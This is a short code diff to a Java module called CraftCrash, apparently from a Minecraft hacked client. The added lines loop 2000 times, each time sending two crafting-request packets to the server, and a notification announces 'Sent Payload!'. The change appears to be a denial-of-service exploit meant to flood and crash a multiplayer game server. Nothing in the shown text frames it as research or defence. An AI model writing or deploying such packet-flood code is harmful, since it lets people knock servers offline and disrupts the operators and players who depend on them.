@@ -68,6 +68,10 @@ public class CraftCrash extends Module {
             }
             if(ticks % 75 == 0){
                 Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Sent Payload!");
+                for(int i = 0; i < 2000; i++){
+                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
+                    client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
+                }
                 this.setEnabled(false);
             }
         }
